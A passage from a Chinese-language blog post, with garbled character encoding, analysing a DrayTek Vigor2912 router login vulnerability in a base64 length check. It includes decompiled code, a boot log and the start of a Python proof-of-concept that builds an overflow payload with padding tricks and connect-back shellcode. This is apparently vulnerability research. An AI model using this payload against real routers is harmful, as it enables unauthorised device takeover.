è½½åŸºåœ°å€ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œä½¿ç”¨ rbasefind æŸ¥æ‰¾å‡ºäº†ä¸€ä¸ªç»“æœï¼š0x80020000</p><p>é€šè¿‡ IDA åŠ è½½è®¾ç½®å¥½åŠ è½½åœ°å€ï¼Œç„¶åç­‰å¾…åˆ†æç»“æŸã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥å†é˜…è¯»ä¸‹æ¼æ´é€šå‘Š[^4]çš„æè¿°:</p><p>Exploitation attempts can be detected by logging/alerting when a malformed base64 string is sent via a POST request to the /cgi-bin/wlogin.cgi end-point on the web management interface router. Base64 encoded strings are expected to be found in the aa and ab fields of the POST request. Malformed base64 strings indicative of an attack would have an abnormally high number of %3D padding. Any number over three should be considered suspicious.</p><p>é€šè¿‡è¿™ä¸ªæè¿°æˆ‘ä»¬å¯ä»¥å¾—å‡ºå‡ ä¸ªç»“è®ºï¼š</p><ol><li>é€šè¿‡è§¦å‘æ¥å£æ˜¯  <code>/cgi-bin/wlogin.cgi</code> å³ç™»å½•æ¥å£</li><li>æåˆ°äº† <code>%3D</code> å¯ä»¥çŒœæµ‹æ¼æ´å‡ºç°åœ¨ <code>base64_decode</code> å‡½æ•°ä¸­ </li></ol><p>ç´§æ¥ç€æˆ‘æŠ“å»äº†ä¸€ä¸ªæ­£å¸¸ç™»å½•çš„ HTTP è¯·æ±‚åŒ…ï¼Œç­‰å¾… IDA åˆ†æå®Œä¹‹åé€šè¿‡å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œæ‰¾åˆ°äº†å¯¹åº”çš„æ¼æ´å‡½æ•°ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png"></a></p><p>å¯ä»¥çœ‹åˆ° username  å’Œ password éƒ½ä¼šé€šè¿‡ base64_decode è¿™ä¸ªå‡½æ•°è¿›è¡Œè§£å¯†ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ ¼å¼ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode(<span class="keyword">char</span> *input, <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> maxlen)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°çœ‹ä¼¼æ˜¯é™åˆ¶äº†æœ€å¤§ decode é•¿åº¦ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªå€¼çœŸçš„ç”Ÿæ•ˆäº†å—ï¼Ÿ æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" title="image-20230429164323660" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" alt="image-20230429164323660"></a></p><p>è¿™é‡Œä¼šæœ‰ä¸€ä¸ª <code>calc_decdoe_len</code>çš„å‡½æ•°ï¼Œæ¥è®¡ç®— base64 decode åçš„é•¿åº¦æ˜¯ä¸æ˜¯å¤§äº maxlen å¦‚æœå¤§äºå°±é€€å‡ºã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±åŸºæœ¬åˆ¤å®šå¤§æ¦‚ç‡é—®é¢˜æ˜¯å‡ºç°åœ¨äº†è¿™ä¸ªå‡½æ•°ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">calc_decode_len</span><span class="params">(<span class="keyword">char</span> *input_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> decode_out_len; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> out_len; <span class="comment">// $v1</span></span><br><span class="line">  _BYTE *in_end_chr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> offset; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !input_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  inputlen = <span class="built_in">strlen</span>(input_buf);</span><br><span class="line">  decode_out_len = <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !inputlen )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  out_len = decode_out_len - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input_buf[inputlen - <span class="number">1</span>] != <span class="string">&#x27;=&#x27;</span> )         <span class="comment">// æœ€åä¸€ä½å¦‚æœä¸æ˜¯ = ï¼Œ å°±ç›´æ¥è¿”å›é•¿åº¦</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  in_end_chr = &amp;input_buf[inputlen];</span><br><span class="line">  offset = decode_out_len - inputlen;</span><br><span class="line">  <span class="keyword">if</span> ( out_len != offset )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (<span class="keyword">char</span>)*(in_end_chr - <span class="number">2</span>);             <span class="comment">// å¦‚æœå€’æ•°ç¬¬äºŒä½ä¸æ˜¯ = ï¼Œ å°± break ï¼Œ è¿”å› out_len </span></span><br><span class="line">      v8 = out_len - <span class="number">1</span>;</span><br><span class="line">      --in_end_chr;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      --out_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != offset );                     <span class="comment">// --outlen ç›´åˆ°å½“å‰çš„å­—ç¬¦ä¸ä¸º = ï¼Œ æˆ–è€… é•¿åº¦ç­‰äº </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡é˜…è¯»ä»£ç ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°çš„é—®é¢˜æ‰€åœ¨ï¼š</p><p>å¤§è‡´å°±æ˜¯ï¼Œ é¦–å…ˆé€šè¿‡ <code>3 * (inputlen &gt;&gt; 2);</code> è®¡ç®—å‡ºä¸€ä¸ªé•¿åº¦ ï¼Œ ç„¶ååˆ¤æ–­æœ€åä¸€ä½æ˜¯ä¸æ˜¯ = ï¼Œ å¦‚æœä¸æ˜¯ç›´æ¥è¿”å›ï¼Œ å¦‚æœæ˜¯æ¥ç€å¾€ä¸‹èµ°ã€‚ </p><p>ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸ªå‡æ³•è¿ç®— <code> offset = decode_out_len - inputlen;</code> ï¼Œ æ­£å¸¸è€Œè¨€ï¼Œ è¿™é‡Œçš„ <code>deocde_out_len</code> åº”è¯¥æ˜¯å°äº <code>inputlen</code> çš„æ‰€ä»¥è¿™é‡Œä¼šæ˜¯ä¸€ä¸ª  è´Ÿæ•°ã€‚</p><p>ç„¶åè¿›åˆ° <code>do .. while ()</code> å¾ªç¯ä¸­ï¼Œ åªæœ‰å½“ å½“å‰å­—ç¬¦ä¸ä¸º = æˆ–è€…ï¼Œ <code>v8 == offset</code> çš„æ—¶å€™æ‰ä¼šé€€å‡ºå¾ªç¯ï¼Œ ç”±äº offset æ˜¯ä¸ªè´Ÿæ•°ï¼Œ å› æ­¤åªæœ‰å½“å‰å­—ç¬¦ä¸ä¸º = æ‰ä¼šé€€å‡ºè¿”å›ã€‚ç„¶ä¼šè¿™é‡Œçš„é•¿åº¦å°±ä¼š<code>--out_len</code> é€’å‡ã€‚</p><p>æ ¹æ®base64 çš„åŸç†æˆ‘ä»¬çŸ¥é“å››ä¸ª = ä¸ºç©º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&quot;====&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› æ­¤åœ¨æ„é€ æˆ‘ä»¬ payload çš„æ—¶å€™ï¼Œ æ¯å¤šäº maxlenï¼ˆè¿™é‡Œæ˜¯ 84 ï¼‰ çš„é•¿åº¦ä¸€ä¸ªå­—ç¬¦ï¼Œ æˆ‘ä»¬å°±éœ€åœ¨åé¢æ·»åŠ   å››ä¸ª ç­‰å·ã€‚ è¿™æ · deocde åçš„é•¿åº¦æ°¸è¿œä¸ä¼šå¤§äº 84ï¼Œ ä½†æ˜¯çœŸæ­£ decode çš„ç»“æœå´ä¼šå¤§äº maxlen</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>æ‹†å¼€æœºå™¨ï¼Œå¯ä»¥å‘ç°å³ä¸‹è§’ 4 ä¸ªpin çš„æ˜¯ è°ƒè¯•å£ ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png"></a></p><p>æ¥ç€ä¸²å£åï¼Œ å¯çœ‹åˆ°ä¸€äº›è¾“å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> ~~Hope you find out the clue here~~</span><br><span class="line">Caught reserved exception 11 - should not happen.NMI taken!!!!</span><br><span class="line">@@@die: NMI @@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vigor2912-DrayLoader-v7 (May  7 2015 - 15:11:57)</span><br><span class="line"></span><br><span class="line">MT6856</span><br><span class="line">DRAM Size: 64 MB</span><br><span class="line">CPU Frequency: 700 MHZ</span><br><span class="line">Flash Manufacture ID: 0xC2, Device ID: 0x20 0x17, Name: MX25L6405D</span><br><span class="line">Flash Size: 8 MB</span><br><span class="line"></span><br><span class="line">Boot DrayOS~~</span><br><span class="line">run_drayos_image: len=5085180</span><br><span class="line">Go~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> !!! Maxi malloc size =31614752 (st=0X821d88e0, end=0X83fff000)!!!!</span><br><span class="line"></span><br><span class="line"> dynamic_mem_pool=0x821e52b0, size=0xc80fff[12M]!Modes: __STDC__ 32-bit mwDWORD==(unsigned long)</span><br><span class="line">mwROUNDALLOC==4 sizeof(mwData)==24 mwDataSize==24</span><br><span class="line"></span><br><span class="line">statistics: now collecting on a line basis</span><br><span class="line"></span><br><span class="line">============= Memwatch Auto Self Test =============</span><br><span class="line"></span><br><span class="line">Normal Free...DETECTED</span><br><span class="line">Double Free...DETECTED</span><br><span class="line">NULL Free.....DETECTED</span><br><span class="line">Wild Free.....DETECTED</span><br><span class="line">Underflow.....DETECTED</span><br><span class="line">Overflow......DETECTED</span><br><span class="line">Unfree 1......DETECTED</span><br><span class="line">Unfree 2......DETECTED</span><br><span class="line"></span><br><span class="line">ALL TEST OK!</span><br><span class="line">Please be assured that all <span class="built_in">test</span> buffers have freed.</span><br><span class="line">Slab kmalloc range:     [0x821E52B0:0x82E662AF](size=13111295 bytes)</span><br><span class="line">Linear malloc range:    [0x821D88D0:0x83FFF000](size=31614768 bytes)</span><br><span class="line"></span><br><span class="line"> ra_system_init() <span class="keyword">in</span>:&lt;6&gt;ISPRAM0: PA=00b68000,Size=00008000,enabled</span><br><span class="line">&lt;6&gt;CPU revision is: 00019555 (MIPS 34Kc)</span><br><span class="line">Ralink RT63365 SOC prom init</span><br><span class="line"></span><br><span class="line"> prom_init() doneFIXME!!! Do we need to complete specific hardware CPU clock setting? or time_init() would complete it ?</span><br><span class="line">set_except_vector: n=0, addr=8003cb80</span><br><span class="line">set_except_vector: n=0, addr=80027684</span><br><span class="line"></span><br><span class="line"> trap_init() <span class="keyword">done</span></span><br><span class="line"> plat_mem_setup() <span class="keyword">done</span>&lt;6&gt;NR_IRQS:64</span><br><span class="line"></span><br><span class="line"> init_IRQ()...CPU frequency 699.00 MHz</span><br><span class="line">clockevents_register_device</span><br><span class="line">cp0_timer_irq_installed: irq = 31</span><br><span class="line">__setup_irq: irq=31, desc=80a80d30, p=80a80030</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line"> time_init()...</span><br><span class="line"> skb_init() donePrimary instruction cache 64kB, VIPT, 4-way, linesize 32 bytes.</span><br><span class="line">Primary data cache 32kB, 4-way, VIPT, cache aliases, linesize 32 bytes</span><br><span class="line"></span><br><span class="line"> cache_init() <span class="keyword">done</span></span><br><span class="line"> ralink_led_init() <span class="keyword">done</span>!!!__setup_irq: irq=29, desc=80a80c90, p=821e8fa0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">Adapter_Interrupts_Init: Successfully hooked IRQ 29</span><br><span class="line"></span><br><span class="line">Adapter_Interrupts_Init: call back registeredAdapter_EIP93_Init: CmdRing_Handle=82e7232c</span><br><span class="line">Adapter_EIP93_Init: ResRing_Handle=82e72328</span><br><span class="line">Adapter: Successfully initialized EIP93v2 <span class="keyword">in</span> ARM mode</span><br><span class="line">PEC_Init: PRNG is initialized</span><br><span class="line">== IPSEC Crypto Engine Driver : Jul  8 2020 15:25:56 ==</span><br><span class="line"></span><br><span class="line"> hw_crypto_init() <span class="keyword">done</span></span><br><span class="line"> NR_IRQS=64.</span><br><span class="line"> ** Enable Global Int **..end..</span><br><span class="line">flash manufacture id: c2, device id 20 17</span><br><span class="line">MX25L6405D(c2 2017c220) (8192 Kbytes)</span><br><span class="line">../sys_misc.c.584: snprintf <span class="built_in">test</span> pass!</span><br><span class="line">../sys_misc.c.584: vsnprintf <span class="built_in">test</span> pass!</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">Ralink APSoC Ethernet Driver Initilization. v3.0  256 rx/tx descriptors allocated, mtu = 1500!</span><br><span class="line">Raeth v3.0 (Workqueue)</span><br><span class="line">__setup_irq: irq=22, desc=80a80a60, p=821e8ea0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line">phy_tx_ring = 0x021ef000, tx_ring = 0xa21ef000</span><br><span class="line"></span><br><span class="line">phy_rx_ring0 = 0x022c6000, rx_ring0 = 0xa22c6000</span><br><span class="line">Fiber ID does not match (FFFF, FFFF)</span><br><span class="line">Fiber does not exist</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">__setup_irq: irq=16, desc=80a80880, p=821e8e20</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">ESW: Link Status Changed - Port2 Link UP</span><br><span class="line">CDMA_CSG_CFG = 81000007</span><br><span class="line">GDMA1_FWD_CFG = C0710000</span><br><span class="line">start PCIe register access</span><br><span class="line"></span><br><span class="line">*************** RT6855A PCIe RC mode *************</span><br><span class="line">PCIE0 no card, <span class="built_in">disable</span> it</span><br><span class="line">PCIE1 no card, <span class="built_in">disable</span> it(RST&amp;CLK)</span><br><span class="line">&lt;4&gt;registering PCI controller with io_map_base <span class="built_in">unset</span></span><br><span class="line"></span><br><span class="line">[SS][Init] Load Service Status from FLASH!!</span><br><span class="line">&lt;6&gt;uVigor2912 by DrayTek Corp.erface driver hub</span><br><span class="line">&lt;6&gt;u==========================ice driver usb</span><br><span class="line">    LAN MAC Address  : 00-1D-AA-93-E5-2C</span><br><span class="line"> usbIP Address       : 192.168.2.1</span><br><span class="line">RT3xIP Subnet Mask   : 255.255.255.0</span><br><span class="line">&lt;6&gt;eFirmware Version : 3.8.12d<span class="string">&#x27; Host Controller (EHCI) Driver</span></span><br><span class="line"><span class="string">__seSystem Up Time   : 0:0:0a80920, p=822ddfa0</span></span><br><span class="line"><span class="string">desc-------- Main Menu ---------&gt;startup=80030078</span></span><br><span class="line"><span class="string">FIXM1 : Enable TFTP Server</span></span><br><span class="line"><span class="string">   Please Select Item : &lt;6&gt;ohci_hcd: USB 1.1 &#x27;</span>Open<span class="string">&#x27; Host Controller (OHCI) Driver</span></span><br><span class="line"><span class="string">VLAN table[2~7] cleaned</span></span><br><span class="line"><span class="string"> usb host init done!!</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usblp</span></span><br><span class="line"><span class="string">----&gt; usb_net_init()aned</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver LTE device driver</span></span><br><span class="line"><span class="string">&lt;---- usb_net_init()) is 1 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_register&lt;6&gt;usbcore: registered new interface driver usbserial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_serial_generic_register</span></span><br><span class="line"><span class="string"> ** DrayDown event==0 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ** DrayUp event==0 **</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usbserial_generic</span></span><br><span class="line"><span class="string">Initializing USB Mass Storage driver...</span></span><br><span class="line"><span class="string">                                       &lt;6&gt;usbcore: registered new interface driver usb-storage</span></span><br><span class="line"><span class="string">USB Mass Storage support registered.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;&lt; sys_board_init_later &gt;&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬é€šè¿‡ PoC æ”»å‡»è®¾å¤‡ä¹‹åï¼Œå¯ä»¥ä»æ—¥å¿—è¾“å‡ºçœ‹åˆ°ä¸€äº› dump ä¿¡æ¯, è¾“å‡ºåŒ…æ‹¬  EPC ï¼Œ å½“å‰å´©æºƒçš„åœ°å€ï¼Œ å¦‚è¿™é‡Œé‡Œæ˜¯ 0xdeadbeafï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png"></a></p><p>è¿˜ä¼šæ‰“å°æ ˆ å’Œ å¯„å­˜å™¨</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png"></a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›è¾“å‡ºæ¥è°ƒæ•´æˆ‘ä»¬çš„ PoC, æ¥è¾¾åˆ°æˆ‘ä»¬ç›®çš„ï¼Œå¦å¤–ä¸ºäº†æ›´æ–¹ä¾¿çš„è°ƒè¯•ï¼Œ æˆ‘è¿˜ä½¿ç”¨äº† qiling è¿›è¡Œéƒ¨åˆ†ä»£ç çš„æ¨¡æ‹Ÿ, æ€è·¯å¦‚ä¸‹ï¼š</p><p>å‰é¢è·‘ä¸€æ®µéšä¾¿çš„ shellcode ï¼Œç„¶åå°† RTOS æ•´ä¸ª binary è¯»èµ·æ¥ï¼Œ å†™å…¥åˆ°æˆ‘ mmap çš„å†…å­˜ä¸­ã€‚ç„¶åè®¾ç½®PC è·³è½¬è¿‡å»ã€‚æœ€åçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_con = asm(shellcraft.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x81B898A0</span></span><br><span class="line">die_func_addr   = <span class="number">0x8007EF90</span> </span><br><span class="line">test_addr = <span class="number">0x8007EF74</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">pay+= <span class="string">b&#x27;B&#x27;</span>* (<span class="number">0x118</span> - <span class="number">8</span> - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># pay+= p32(0xdeadbeaf) # s0</span></span><br><span class="line">pay+= p32(password_addr) <span class="comment"># s1   </span></span><br><span class="line">pay+= <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">pay+= p32(test_addr) <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">padding = len(pay) - <span class="number">84</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pay).decode(<span class="string">&#x27;latin&#x27;</span>) + <span class="string">&#x27;=&#x27;</span> * (padding * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_1</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.log.info(<span class="string">&#x27;now run at: 0x807767A0&#x27;</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807768B8</span> <span class="comment"># decode username</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_2</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766ec</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_3</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span 